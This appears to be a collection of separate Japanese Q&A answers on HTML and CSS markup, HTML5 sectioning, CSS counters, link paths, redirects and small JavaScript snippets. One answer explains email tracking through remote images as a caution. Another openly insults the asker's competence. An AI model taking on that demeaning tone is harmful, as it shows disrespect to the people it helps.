そもそもおかしいですね。!! 111111111111111111111111 ←この改行はなんでしょう。 111111111111111111111111 ←この改行はなんでしょう。 222222222222222222222222 ←この改行はなんでしょう。 　 あなたの質問文をHTMLでマークアップすると <p> こうしてPタグにmargin-bottomなりを設定して間隔をあけていました。 </p> <p> でも別に段落でもないのにそれってどうなのかと。一つのPタグの中で各数字の間に間隔を入れる手段なんてあるのでしょうか？ </p> <p> 無茶な手法とかではなく、メジャーな手段があればぜひ教えていただきたいのですが。検索はあれこれしたのですが、どうも的確なものが見当たらなくて。 </p> <p> いい手段をお持ちの方いらっしゃいましたら、ご教授お願いいたします。 </p> とマークアップするだけで、上記質問に書かれているように整形されるはずです。 　　<BR>は使うべきではありません。!!! 　　段落はParagraph--段落---を示すpでマークアップします。 日本語のように大きなフォントだと読みにくいですから p{margin:0;line-height:1.8em;text-indent:1em;} 間を空けたければ、 p{margin-bottom:1em;line-height:1.6em;text-indent:1em;} とかにします。 　もし、それが本文内の記事だけそうしたいなら HTML5なら 　section p{margin:0;line-height:1.8em;text-indent:1em;} HTML4.01なら 　div.section p{margin:0;line-height:1.8em;text-indent:1em;} とすれば良いです。 　また、間を開けたいという意味が分からないので、具体的にどういう場面かを示していただくとよいでしょう。
ttp://nojhon.s71.xrea.com/leclink12.html <a href="test.zip">download</a> <a href="はtest.zipに飛ばす訳だからtest.zipがパソコン上で同じフォルダー内にあればネットと違い ダウンロードされることなくｚｉｐファイルに関連付けた自分のパソコンのソフトが起動し表示される。 フォルダーから移動すればファイルを探す動作をする。
#2 でご質問の HTML5 に SDK が無い根拠、とはなかなか難しい質問ですが回答してみます。 CERN の研究者 ティム・バーナーズ・リー氏が World Wide Web を開発し、公有の技術としたのが 20年前 参考) http://japanese.engadget.com/2013/04/30/www-20/ 氏はこの技術を、誰でも使えるような設計としました。なので、 ・開発ライセンスなど存在しません ・テキストのまま公開するので、コンパイル作業はありません ・公開前の事前検証を必要としません つまり、SDK を必要とするような要因を尽く排除しています。 現在は 暗号化 / jQuery / 埋め込み動画 / Google公開API などの為に、個別に SDK が存在するケースがありますが、Web の最新規格である HTML5 においては今も昔も変わらずに SDK は存在しません。 ただ仕様書だけがあります。 仕様書さえあれば開発が可能なのが Web 技術というものです。 (それに加えて相互運用性の雑多なノウハウも必要なのが悲しいところではあります...) 統合開発環境というのは、仕様書に即した開発が出来るように手助けするものなので、絶対に必要なものではありませんが、便利なのでよく使われます。ですがコレを SDK とは呼べないでしょう。
HTML だけでは無理ですね。というわけでスクリプトで実現する方法です。 <a href="aaa.html" onclick="return openWin2()">開く</a> <!-- href はスクリプト無効時の保険 --> <script> function openWin2() { setTimeout(function(){ window.open('aaa.html', 'aaa', 'left=320,top=0,width=320,height=200'); }, 1000); // 押下1秒後に表示 setTimeout(function(){ window.open('bbb.html', 'bbb', 'left=0,top=200,width=320,height=200'); }, 3000); // 押下3秒後に表示 return false; } </script>
より具体的に書くと <body> 　<header><!-- この文書のheader --> 　　<h1>見出し</h1> 　　<nav> 　　　<ol> 　　　　<li><a href=""></a></li> 　　　・・・・ 　　　</ol> 　　</nav> 　</header> 　<section> 　　<h2>本文見出し</h2> 　　<p>記事</p> 　　<section> 　　　<h3>見出し</h2><!-- sectionはひとつだけheadingを持つべき --> 　　</section> 　　<aside> 　　　<h3>補足・関連情報</h3> 　　</aside> 　　<nav> 　　　<h3>関連情報 　　　<ol> 　　　　<li><a href=""></a></li> ・・・ 　　　</ol> 　　</nav> 　</section> 　<footer> 　　<h2>文書情報</h2> 　　<p><a href=""></a> | <a href=""></a></p> 　　<address></address> 　</footer> </body> とかでしょうか？？？ 　⇒HTML5( http://www.w3.org/TR/html5/ ) ここに実例が!! 　⇒Semantic navigation with the nav element | HTML5 Doctor( http://html5doctor.com/nav-element/ )
私自身その状態になったことがないのでなんともいえませんが こんなサイトがヒットしました http://www.sunsweb.net/archives/110 ざっと、 ・マシンやブラウザの不調 ・cssで@importを使っていると不調になる という内容のようです。検証してみては？
＞HTML5だとaタグで要素全体を囲えるとのことなので、 　つまみ喰いはダメです。括れますが・・・<dl>要素には<dt><dd>要素以外は含むことが出来ません。 <dl> 　<dt><a href="">日付</a><dt> 　<dd><a href="">メッセージ</a></dd> 　<dt><a href="">日付</a><dt> 　<dd><a href="">メッセージ</a>/dd> 　<dt><a href="">日付</a><dt> 　<dd>メッセージ</dd> </dl> と書かなければなりません。 無難なのは <ul> 　<li> 　　<dl> 　　　<dt><a href="">日付</a></dt> 　　　<dd><a href="">記事</a></dd> 　　</dl> 　</li> 　<li> 　　<dl> 　　　<dt><a href="">日付</a></dt> 　　　<dd><a href="">記事</a></dd> 　　</dl> 　</li> にてli:hover{}でしょうね。
たとえばこんな感じ？ <script> function s(f){ var se=f.elements["se"]; for(var i=0;i<se.options.length;i++){ if(se.options[i].selected){ switch(se.options[i].value){ case "g": document.getElementById("searchword").name="q"; f.action="http://www.google.com/search"; f.submit(); break; case "y": document.getElementById("searchword").name="p"; f.action="http://search.yahoo.co.jp/search"; f.submit(); break; } } } } </script> <form action="#" method="get" target="_blank"> <p> <input type="text" id="searchword" value=""> <select name="se" multiple> <option value="g">Google</option> <option value="y">Yahoo</option> </select> <input type="button" onclick="s(this.form);" value="go"> </p> </form> 日本語の処理とかサーチエンジンごとに調整してください
まずtypeが書かれていません。 それと、rel=""の中に不要な「=」が書かれています。 下記の様に書いてみてください。 <link href="style.css" rel="stylesheet" type="text/css"> また、この書き方の場合、読み込むhtmlファイルと同ディレクトリにstyle.cssがある場合に有効になります。 例えば、htmlファイルがあるフォルダに「css」というフォルダを作って、 そこにstyle.cssを入れるような場合には <link href="css/style.css" rel="stylesheet" type="text/css"> と書きます。 ちなみに、これはhtmlの場合で、xhtmlで記述するなら下記の様になります。 <link href="css/style.css" rel="stylesheet" type="text/css" />
ご質問文を読んだ印象では、内容こそ違いますが、やりたいことは掲示板やチャットと似ているのではないかと思います。 クライアント側からの送信量に制限があったかも知れませんが、サーバ側での制限はほとんどなくなりますので、そのような考え方ではまずいのでしょうか？ 結果的にajaxも不要になりますし、ほとんどをサーバ側で処理するという仕組みにはなりますが…
floatを使わない。floatを使うと、その要素は他から独立してしまいます。 そもそもHTMLおかしいし・・・ textareaがあるということは、formですか？table使う必要がありますか？ left-boxとかright-boxとか、端末によって下に回したりとかしたら名前と整合が取れなくなる。 所詮、メインはtableですからその後に記述したので良い。 　スタイルシートを利用できない端末や、検索エンジンにはこの情報はtableの後でよいはずです。floatを使うと文書の順番も変える必要が出てくる。 [サンプル]HTML4.01strict+CSS2.1 ★The W3C Markup Validation Service( http://validator.w3.org/#validate_by_input ) ★W3C CSS 検証サービス( http://jigsaw.w3.org/css-validator/#validate_by_ … ) 　で検証済み!!のウェブ標準です。 ※タブは＿に置換してある。★必ず戻すこと★ 1) tableはstaticのままですから、それを含むsection(本文)はあわせて伸縮します。 2) 本文セクションのナビの高さはsectionの高さに合わせて伸縮します。 　section{position:relative}　+ div.section div.nav{position:absolute;}なので 3) 将来navを上にしようが、左にしようが下にしようが・・自在にデザインできます。 4) 分かりやすいように背景は黄色にしてあります。 5) HTML5にするときは、そのままclass名を要素名に 　<div class="header"></div>→<header></header> 　class名と使い道はHTML5に合わせてある。section,nav,footerも <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;} div.header,div.section,div.footer{width:80%;margin:0 auto;min-width:640px;max-width:800px;} /* ここから */ div.section{ position:relative;min-width:0; min-height:100px;/* section navに最低限必要な高さ */ } div.section h2, div.section table[summary="form"]{ margin-left:200px;/* 左をあける */ width:auto; } div.section div.nav{ position:absolute; top:0; width:200px; background-color:yellow; height:100%; } div.section div.nav h3{margin-top:10px;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>本文</h2> ＿＿<form action="./"> ＿＿＿<table summary="form"> ＿＿＿＿<tbody> ＿＿＿＿＿<tr> ＿＿＿＿＿＿<th abbr="name">お名前</th> ＿＿＿＿＿＿<td><input type="text" name="name" size="20" value=""></td> ＿＿＿＿＿</tr> ＿＿＿＿＿<tr> ＿＿＿＿＿＿<th abbr="message">メッセージ</th> ＿＿＿＿＿＿<td><textarea rows="10" cols="40" name="m1"></textarea></td> ＿＿＿＿＿</tr> ＿＿＿＿＿<!-- 自由に加減してください。 --> ＿＿＿＿＿<tr> ＿＿＿＿＿＿<th abbr="message">メッセージ</th> ＿＿＿＿＿＿<td><textarea rows="10" cols="40" name="m1"></textarea></td> ＿＿＿＿＿</tr> ＿＿＿＿＿<tr> ＿＿＿＿＿＿<th abbr="message">メッセージ</th> ＿＿＿＿＿＿<td><textarea rows="10" cols="40" name="m1"></textarea></td> ＿＿＿＿＿</tr> ＿＿＿＿</tbody> ＿＿＿</table> ＿＿</form> ＿＿<div class="nav"> ＿＿＿<h3>その他の情報</h3> ＿＿</div> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿＿<dt id="LAST-MODIFIED">Last Modified</dt> ＿＿＿<dd>2012-08-10 12:00:00 (JST)</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
No.2です。 pathまで、気が回りませんでした。 私の想像で、回答すると どうも、pathの概念が理解できていないので、つまずいている様な気がします。 pathとは、住所みたいなものです。 手紙を出す時には、宛先を書きますよね。 それと同じように、fileのpath(住所)を書いて、コンピュータに、教えてあげる必要があるのです。 私が、link tag は、これであってると書いたのが、ダメだったんですね・・・ <a href="download.doc">Word File DL</a> これで、イイのですが、これは、word file と html file が、同じdirectory内に、存在する時の話です。 directoryが違えば、pathも変わります。 例えば <a href="./hogehoge/download.doc">Word File DL</a> これの意味を理解してください。 上と何が、違うか分かりますか。 pathが違うのです。(正確にいうと、pathが詳細に書いてある。) 最後に、download.docと書きましたが download.doc と download.docx も違いますよ。これは、拡張子のお話し、念のために。 これが原因の様な気もしますね。 同じdirectoryにあるなら、これで、どうですか。 <a href="download.docx">Word File DL</a> では、頑張って！！
Firefoxの開発版はバージョン24なのですが どちらにしろFirefoxはmp3には対応していません いろんな形式に満足に対応しているのはChromeくらいのものです とりあえずwavを一番上にしてみたらどうですか？ また、Chrome等で再生できるか試してみてください
>サーバ側に hoge.txt という設定ファイルがあり、このファイルを起動時に読込みたい それはFileReaderではなく、いわゆるAjaxでやることではないでしょうか？
.htacces はPATH_INFOの下位から順番に処理されます。 言い換えれば、下位ディレクトリ(そのファイルの存在するディレクトリ--http://example.com/tokutei/)にリセット.htaccessを書いておけば良いのでは？ RewriteCond や RewriteRuleを使って経験はないのですが、試してみてください。 　
ソースを見た第一印象 　まずHTML4.01strictをしっかり復習されることをお勧めします。 ・articleはheader,section,footer要素を持つであろう、それ自身で完結した記事をマークアップする要素ですから、ひとつしかない全体を囲む場合はあえて使う必要はないでしょう。 ・footerに書くサイト一覧のようなリンクはNAVを使うべきではないとされています。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから Not all groups of links on a page need to be in a nav element — the element is primarily intended for sections that consist of major navigation blocks. In particular, it is common for footers to have a short list of links to various pages of a site, such as the terms of service, the home page, and a copyright page. The footer element alone is sufficient for such cases; while a nav element can be used in such cases, 略 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［4.4 Sections — HTML5( http://www.w3.org/TR/2012/CR-html5-20121217/sect … )］より 　ページ上のすべてのリンクグループが nav 要素の中にある必要はありません。nav要素は、主節、すなわち主要なナビゲーション・ブロックからなるセクションを対象としています。特に、サービス規約、ホーム、著作権ページといったサイトのさまざまなページへの短いリンクリストをフッターに入れることが一般的ですが。このような場合は、footer 要素だけで十分です。 　footer自体が、そのような意味合いを持っているため、ここでnavは使いません。 ・段組にfloatは使わないほうが良いです。例えばasideをfloat:leftにするとその後で解除することが出来なくなります。基本はabsoluteです。absoluteだと、floatさせるために記事の順番を変えるなどの文書構造を弄る必要がなくなります。 ・余計な要素(タグ)が多いです。デザインのためではなく文書構造をマークアップするのですから、極力減らしたほうが良いです。本当に必要なのか？ ・セレクタはCSS2以降は基点となるセレクタを書くことになりました。セレクタの書き方を見直しましょう。 　それだけで、HTMLもCSSもとても判りやすくなります。 ★書いたら、Validatorでチェックすること HTML: Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html ) CSS: W3C CSS 検証サービス( http://jigsaw.w3.org/css-validator/#validate_by_ … ) ★タブは、＿に変換してあるので戻すこと。 <!doctype html> <html> ＿<head> ＿＿<meta charset="utf-8"> ＿＿<title>サンプル</title> ＿＿<meta name="description" content=""> ＿＿<meta name="author" content="IRUKA"> ＿<style media="screen"> <!-- html,body{ margin:0;padding:0; } header,body,footer{ width:90%; min-width:640px;max-width:1000px; margin:0 auto; } h1,h2,h3,h4,p{ margin:0;padding:0; line-height:2em; } p{text-indent:1em;} header nav ul,header ul li{ list-style-type:none; text-align:center; } header ul li{ display:inline-block; } section{ position:relative; min-height:400px; width:auto; min-width:0; } section section{ min-height:0;height:auto; margin-left:25%; } section section aside{ float:right; width:35%; } p.comment{clear:right;} section nav{ position:absolute; top:0;left:0; width:25%;height:100%; } footer ul{ text-align:center; } footer ul.siteMap li{ list-style-type:none; display:inline; } footer ul.siteMap li+li:before{ content:" | "; } --> ＿</style> ＿</head> ＿<body> ＿＿<header> ＿＿＿<h1>Web開発室ブログ</h1> ＿＿＿<nav> ＿＿＿＿<ul> ＿＿＿＿＿<li><a href="#hoge">最新の投稿</a></li> ＿＿＿＿＿<li><a href="#hoge">アーカイブ</a></li> ＿＿＿＿＿<li><a href="#hoge">開発者向け</a></li> ＿＿＿＿＿<li><a href="#hoge">お問い合わせ</a></li> ＿＿＿＿</ul> ＿＿＿</nav> ＿＿</header> ＿＿<section> ＿＿＿<section> ＿＿＿＿<h2>なぜHTML5が次のWeb開発スタンダードになりえるのか</h2> ＿＿＿＿<p> ＿＿＿＿＿開発プロジェクトリーダー太郎 ＿＿＿＿＿<time datetime="2010-10-01T14:39">October 1st, 2010 at 2:39PM</time> ＿＿＿＿</p> ＿＿＿＿<p> ＿＿＿＿＿HTML4.01が世の中に発表されてから、HTML規格の外側で様々なアイデアやシステムが試行錯誤されてきました。結果、複数の団体が「Webの基準」を目指してアイデアやシステムの営業に躍起になっていました。つまりHTMLは、基本的なぶぶんでは「業界標準」でしたが、求められる装飾や細かな部分については機能不足だったのです。 ＿＿＿＿</p> ＿＿＿＿<aside> ＿＿＿＿＿<h3>Something aside</h3> ＿＿＿＿＿<p> ＿＿＿＿＿＿スマートフォンのブラウザはパソコンのブラウザよりも意図的にHTML5の仕様に対応しています。 ＿＿＿＿＿</p> ＿＿＿＿</aside> ＿＿＿＿<p> ＿＿＿＿＿機能不足が指摘されていた「装飾」の部分について、HTML5は大きな一歩を踏み出しました。 ＿＿＿＿＿オーディオやムービーをHTML5の機能だけで実現できるように拡張し、 ＿＿＿＿＿本来の利用方法とは違った使われ方をしていた様々な要素に対する解決策を打ち出しました。 ＿＿＿＿</p> ＿＿＿＿<p class="comment"> ＿＿＿＿＿<a href="#"><i>25 コメント</i></a>... ＿＿＿＿</p> ＿＿＿</section> ＿＿＿<nav> ＿＿＿＿<h3>アーカイブ</h3> ＿＿＿＿<ul> ＿＿＿＿＿<li><a href="2010/10">October2010</a></li> ＿＿＿＿＿<li><a href="2010/9">September2010</a></li> ＿＿＿＿＿<li><a href="2010/8">August2010</a></li> ＿＿＿＿＿<li>・・・【中略】・・・</li> ＿＿＿＿＿<li><a href="2010/2">February2010</a></li> ＿＿＿＿＿<li><a href="2010/1">January2010</a></li> ＿＿＿＿</ul> ＿＿＿</nav> ＿＿</section> ＿＿<footer> ＿＿＿<h3>A nice footer</h3> ＿＿＿<ul class="siteMap"> ＿＿＿＿<li><a href="#">ホーム</a></li> ＿＿＿＿<li><a href="about">About</a></li> ＿＿＿＿<li><a href="terms.html">サービスの条件</a></li> ＿＿＿＿<li><a href="privacy.html">プライバシーについて</a></li> ＿＿＿</ul> ＿＿＿<address>©2010 パソコン教室</address> ＿＿</footer> ＿</body> </
>>ネットを使い調べていますが、答えに優先順位を付けて結果を出す方法がどうしても分か りませんので、教えていただけませんか？ 通常は、その手段としてプログラムを記述します。ですので、質問者さんは １）いろんなプログラム言語があるけど、自分の使う動作環境を考慮し、どれを使うかを決める。 ２）選んだプログラム言語を勉強する。 ３）やりたい処理を画面フローやフローチャートで表現する。フローチャートが分からないなら調べる。 ４）画面フロー、フローチャートを元に、選んだプログラム言語とＨＴＭＬを記述する。それ以外に必要なモロモロがあれば設定する。 ５）予定の動作をするかテストしてみる。不具合があれば修正する。 こんな感じでしょうか？
ブラウザの設定で文字を大きくしてるからではないでしょうか。 Chromeでも文字を大きくすれば改行されて表示されるようになると思います。
No.2です。すみません、訂正です。 数式が改行されると良くないので、<pre>の方が良いも知れません。 <p>aを求める計算式は、下記の通りとする。</p> <pre>a = b * c + d</pre> <div> aを求める計算式は、下記の通りとする。 <pre>a = b * c + d</pre> </div> ブラウザをMathML対応ブラウザに限定できるならMathMLがいいと思いますが、 <img>がよく使われると思います。 （imgの代替コンテンツは、数式をプレーンテキストで表現したもの） <p>aを求める計算式は、下記の通りとする。<br> <img src="expression.png" alt="a = b * c + d"></p>
私なら崩れている周囲のプロパティを見直します。 marginで指定しているところをpaddingにしてみたりだとか、場合によっては無意味なposition:relative;を追加したりだとか、代替＆追加する方向で直しますね。 場合によってはレイアウトに関わるプロパティも代替します。floatをinline-blockでやったり。 キャッシュさせない方向でも良いんですが、汎用性下がりますし。
お調べさせて頂いたところ、インデントの先頭が全角スペースになっておりますので、 そこを修正していただければIEで表示されるという余白は消えるはずです。
フリー 　⇒mi - テキストエディタ( http://mimikaki.net/ ) シェア 　⇒Jedit X Rev.2 | Artman 21( http://www.artman21.com/jp/jedit_x/ ) 　⇒skEdit 4.*( http://www.altech-ads.com/product/10003714.htm ) UNIX系 KDE 　⇒KWrite( http://www.kde.gr.jp/applications/utilities/kwri … )
肝心な疑問から、少し外れていたようなので補足します。 ＞HTMLのオプションとして汎用性のあるものではなく、 　とても汎用性があり、QUERY_STRINGより多く使われています。 例えば 　http://www.yomiuri.co.jp/atmoney/news/20130514-O … 　という読売新聞の記事　/news/20130514-OYT1T00311.htm はPATH_INFOでサーバーのどこを探しても、そんなディレクトリもファイルも存在しないでしょう。 　atmoneyがプログラムで、それ以降は動的に作られている。あるいはatmoneyもPATH_INFOかも・・ ＞ある特定のサーバーで設定された、特別な動作（カウントしてリダイレクトなど）を するためのPQUERY_STRINGとして使われているのではないか？ 　業務用の大規模なサイトは、基本的にドメイン以降はすべて動的に作成されていることが多いでしょう。データベースにデータさえ上げておけば、主文以外はすべて自動的に作ってくれる。 　考えてみれば、新聞社のページなんて大部分は同じで、主文しか違わない。効率から考えても。 　たまたま、あなたが見つけられたURLは、あからさまに判るような書き方がされているだけ。悪意があるときは・・次のようにします。 　HTMLメール/テキストメールに画像(URL)を貼り付けて、その画像が読み込まれることで、受信者のメールが実在することや、興味の対象を知ることが出来るのですよ。 　http://hpcgi1.nifty.com/Iruka/ENV_FORM.cgi/byrdl … とかね。だからメールではリモート画像を表示させてはならないのです。(上記はHTMLが出力しますが画像を表示するなんてわけもない事です。)
キーワード設定はＳＥＯの基本だと思いますよ。 ページごとにＧｏｏｇｌｅにインデックスされますので、 そのページに関係したキーワードを設定したほうが、 広い範囲が網羅できると思います。 キーワードの設定は、 【ネットユーザーは、どんなキーワードで検索するだろうか】 を考えるとよいかと思います。 大きな会社であれば、会社名や商品名もよいかと思います。 会社名で検索する人がいなさそうなら、 【その商品を欲しがる人はどんなことに困っているか】 という視点で見るとよいかもしれません。
　tableにwidthを指定していない限り、tableは列すべてのセルについて内容を改行なしに表示できる最小幅になるはずです。 　罫線とはtableのbrderです。 　そうではなく、ブロック要素のborderでしたら、デフォルト幅はコンテナブロック、ルートの場合はウィンドウサイズを参照しますから、ウィンドウ幅になります。 　ですので、ブロック要素でしたらdisplay:の値をinline-block,table,table-cellの何れかにすれば良いです。
先にマッチしたものから適用されますから。 Redirect permanent /hoge/link/ http://www.example.com/ Redirect permanent /hoge/ http://www.example.com/
ブラウザの中の話ですよね？ デバッガ使えば出来ますよ。 今時のブラウザならだいたいついてます。（IEだと微妙だけど・・・）
olにはわざわざ番号を振ることはないですが、h1～h6には階層の番号を振りますね。 第1節第2章2項　とか。 [Element]:beforeセレクタ とcontent:(内容の追加プロパティ) と、counterを使います。 　⇒4.3.5 カウンタ（Counters）( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 　⇒12.5 カウンタと自動番号振り（Automatic counters and numbering）( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 　⇒12.5.1 カウンタの入れ子と作用範囲（Nested counters and scope）( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 　が資料になります。 ポイントは、カウンターリセットは、カウントする自身では出来ないので、 <ol> 　<li>　ol liでサブ項目のカウントをリセットする。 　　<ol> 　　　<li></li>　ol li ol li でカウントする。 　　　<li></li> 　　</ol> 　</li> ようにすれば良いでしょう。 /*見出しのナンバリング */ body ol { counter-reset: chapter; /*　あらかじめリセットしておく必要がある */ } body ol ol{ counter-reset: section; /*ol li ol li:before ではなく ここでリセットしなければならない */ } body ol ol ol{ counter-reset: sub_section; /*　ol ol ol li:before ではなく h2 でリセットしなければならない */ } body ol li:before { content: counter(chapter) "-"; counter-increment: chapter 1; } body ol li ol li:before { content: counter(chapter) "-" counter(section) "-"; counter-increment: section 1; } body ol li ol li ol li:before { content: counter(chapter) "-" counter(section) "-"counter(sub_section) "-"; counter-increment: sub_section 1; } とか・・テストしてません。
それはメタ情報ではありません!! 　メタ情報とは、コンピューターに対して与える情報で<head></head>内に書きます。 　たった一つしかないのでしたらわざわざarticleで囲う必要はないでしょう。 <ul><li>日付</li><li>カテゴリ</li></ul> が何を意味するのかわかりませんが、この文書の情報でしたら<footer>に入れたほうがよいでしょうね。 <body> 　<header> 　　<h1>文書のタイトル</h1> 　　<nav></nav> 　</header> 　<section> 　　本文 　</section> 　<footer> 　　文書情報 　　<ul id="documentInfo"> 　　　<li><time>2011-11-12</time></li> 　　　<li id="Category"></li> 　　</ul> 　</footer> </body> #documentInfo,#documentInfo li{list-style:none;margin:0;padding:0;} #documentInfo{position:absolute;top:0;left:0;} #documentInfo li{display:inline-block;} 　HTML5の最大の変更ポイントは文書構造のマークアップです。footer的な内容ですから、footerに入れるのが筋でしょう。
>送信するページが別々になっています。 考えてみてください ２か所に送ったら、表示されるのはどっちのページですか？ その辺の解決策を検討済みならajaxで送りつけたり、別ウィンドウをひらいて javascriptで対処したりはできると思います
＞同じようなテーマのサイトは同一のドメイン内にまとめたほうがSEO的に有利という話を聞いたので、 　そもそも、それがうそです。 　大きなサイトでは、テーマごとに異なるドメインなんて沢山あります。サイトという場合はドメインとは無関係です。ひとつのサイトでドメインが異なってても、きちんとサイトマップが出来ていれば、全く気にすることはありません。
No.3です。 ＞１つのセクションにつき見出しは１つであり<hgroup>の中のもっとも高いランクの見出しがそのセクションの見出しとして機能するので<hgroup>が複数あると見出しが複数あることになってしまうから誤りだと言われているのでしょうか・・・？ 　いえ、HTML5ではh1→h6の数字ではなく、sectionの段階数でアウトラインが決定されます。h1～h6の数字は見出しのランクを決めるだけの意味しかなく。 『These elements have a rank given by the number in their name.( http://www.w3.org/TR/2012/CR-html5-20121217/sect … )』 　⇒4.4.11 Headings and sections( http://www.w3.org/TR/2012/CR-html5-20121217/sect … ) 　sectionはあらゆる階層の見出しを含むことが出来ますが ・すべてに統一してh1を使用するか ・階層に見合った見出しを使うか の何れかに整理することが強く推奨されています。 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 　⇒4.4.11 Headings and sections( http://www.w3.org/TR/2012/CR-html5-20121217/sect … ) ＞ところで最初の記述の<hgroup>のランクが２ですからその下のセクションのアユの見出しランクは４ではなく３では？ ＞それから途中から</hgroup>だけが書き込まれていますが誤って挿入したものですよね ＞あと最後の記述では<section id="Fish">の見出しランクが２でその中にある<nav>のランクも２になっているのですが・・・ (^^)書き直しておきます。 ★下記に非常に良い説明があります。 　⇒The section element | HTML5 Doctor( http://html5doctor.com/the-section-element/ ) <section id="Fish"> 　<h2>魚類</h2> 　<section id="Freshwater_fish"> 　　<h3>川魚</h3> 　　<p>ここで川魚とは、一生の大半を淡水域で生活する魚を言う。サケ類の降海形は含まない</p> 　　<section id="Ayu"> 　　　<h4>アユ</h4> 　　　<p>キュウリウオ目に分類される、川と海を回遊する魚で一生の1/3は汽水域を含む海洋で生活する。</p> 　　　・・・・ 　　</section> 　　<section id="Trout"> 　　　<h4>マス</h4> 　　　<p>降海型でないイワナやヤマメ</p> 　　　・・・・ 　　</section> 　</section> 　<nav id="contentTable"> 　　<h3><a href="#Fish">魚類</a></h3> 　　<ol> 　　　<li><a href="#Freshwater_fish">川の魚</a> 　　　　<ol> 　　　　　<li><a href="#Ayu">アユ</a></li> 　　　　　<li><a href="#Trout">マス</a></li> 　　　　</ol> 　　　</li> 　　　<li><a href="./Sea_Fish.html">海の魚</a> 　　　　<ol> 　　　　　<li><a href="./Sea_Fish.html#Japanese_horse_mackerel">アジ</a></li> 　　　　　<li><a href="./Sea_Fish.html#Sardine">イワシ</a></li> 　　　　</ol> 　　　</li> 　　</ol> 　</nav> </section>
それ以前に、そのHTMLは標準モードで起動してますか？ 　IEのみ・・なんて書かれているので？？？ 　標準モードでしたら、この手のブラウザ間の誤差はなくなるはずです。 DOCTYPEスイッチ( https://www.google.co.jp/search?q=DOCTYPE%E3%82% … )いまどき互換モードで作成している人はないでしょうが・・ 　ボックスのサイズは、paddingの内側です。それを使って配置すれば良いです。 　ルート要素は、ウィンドウ幅を参照します。
HTMLはJavascriptのロードをします。 Javascriptは視覚効果をもたらす配布スクリプトが多いようです。 jquery-1.7.2.min.js　　　　　　　　　　jQueryの基本スクリプト（圧縮版） →これがないとはじまらない jquery.queryloader2.js →Now loading ...みたいなものを表示 jquery.parallax-1.1.3.js　　　　　　　 →マウスに連動して背景が動く jquery.localscroll-1.2.7-min.js　　　　jquery.scrolldeck.jsに必要 jquery.scrollTo-1.4.2-min.js　　　　　 jquery.scrolldeck.jsに必要 jquery.easing.1.3.js　　　　　　　　　 jquery.scrolldeck.jsに必要 jquery.scrollorama.js　　　　　　　　　jquery.scrolldeck.jsに必要 jquery.scrolldeck.js　　　　　　　　　 jquery.scrolldeck.jsに必要 →http://johnpolacek.github.io/scrolldeck.jsの、Examplesを見てください。 jquery-contained-sticky-scroll.js　　 →常に所定の位置に再度バーを表示 lightbox.js →画像の表示 parallax01.js yazirusi01.js →不明でした jquery.mousewheel.js →マウスホイールをサイトで扱う jquery.easie.js →マウスホイールに余韻を残す jquery.smoothScroll.js →指定した時間をかけてでページをスムーズにスクロールする php_date.js →JavaScriptのDateオブジェクトを拡張する script.js →このサイト固有かと思われます。
>「div1」には背景色を設定し、横幅100％で表示しています。 あなた自身がこう指定したのだから >「div1」の幅が元々の画面サイズまでしか描画されません。 こうなるのは当然でしょう、頭がおかしくなっていますね、そうでなければもともとHTMLとCSSを理解しきれていない >DIVの幅を常に100％にしたい と言っておきながら >テーブルの幅が大きくなった時に、「div1」も一緒に大きくなるようにするには などと問い、矛盾したことを同時に要求する、そして >外枠用のテーブルを使えばできるのでしょうが これなどはまったく意味不明ですね ほかの人も言い触れていますが、そもそもあなたが提示したHTMLの記述では何のために<div>が２重に<table>を囲っているのですか？ 背景画像の上に<table>があるだけのページなら、<div>はまったく不要ですよ？ おそらくリキッドレイアウトをとっているのでしょうが それを勉強するときに、幅の最大値と最小値を設定するべきだというのを学ばなかったんですね <div>のmin-widthをiPhoneの幅より大きくとれば解決するはずです
もちろん W3C の原文にはちゃんと書いてあります. 各要素にはその要素で使うことのできる属性が列挙されており, その中の「グローバル属性」に独自データ属性は含まれます. で独自データ属性は「"data-" ではじまる」という条件が付いていますから, 「例えば」のようなものは不可です. 自分で確認してみてはどうでしょうか. ちなみにその「独自データ属性」の説明には誤訳があります. 日本語が通じないので, じっくり読めば一瞬で気付くと思いますが (「の」が重なっているのもおかしいけどそこではない).
質問内容を愚直に実現しました。 <script>addEventListener('load',function(e){ var go = function(e) { window.location = e.target.href }; var stepLinks = [ /**/ [ 130, 110, 'stepInit.html' ], // ボタンの X座標, Y座標, リンク先 /**/ [ 130, 250, 'stepAdd.html' ], // 座標は画像左上からのピクセル単位指定 /**/ [ 130, 310, 'stepInc.html' ], ]; stepLinks.forEach(function(step){ /**/ var b = document.createElement('button'); /**/ b.href = step[2]; // 少々汚い手口 /**/ b.addEventListener('click', go, false); /**/ b.style.position = 'absolute'; // 親要素(=画像)からの相対指定 /**/ b.style.left = step[0] + 'px'; /**/ b.style.top = step[1] + 'px'; /**/ b.style.zIndex = +1; // 画像の上に表示する /**/ b.appendChild(document.createTextNode('詳細')); /**/ document.getElementById('chart').appendChild(b); }); }, false);</script> <div id=chart style="position:relative"> <img src="http://upload.wikimedia.org/wikipedia/commons/th … width=220 height=440> </div>
